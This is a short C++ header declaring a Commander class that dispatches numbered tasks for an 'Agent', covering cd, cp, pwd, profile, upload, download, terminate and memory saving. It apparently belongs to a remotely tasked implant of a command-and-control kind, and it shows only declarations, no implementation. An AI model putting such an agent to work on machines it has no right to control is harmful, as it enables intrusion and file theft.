#pragma once

#include <Windows.h>
#include "Packer.h"
#include "Agent.h"

#define COMMAND_CD		  8
#define COMMAND_CP        12
#define COMMAND_PWD       4
#define COMMAND_PROFILE   21
#define COMMAND_TERMINATE 10
#define COMMAND_UPLOAD    33

#define COMMAND_SAVEMEMORY 0x2321
#define COMMAND_ERROR      0x1111ffff

class Agent;

class Commander
{
public:
	Agent* agent;

	Commander(Agent* agent);

	void ProcessCommandTasks(BYTE* recv, ULONG recv_size, Packer* outPacker);

	void CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker);

	void CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker);
	void Exit(Packer* outPacker);

};
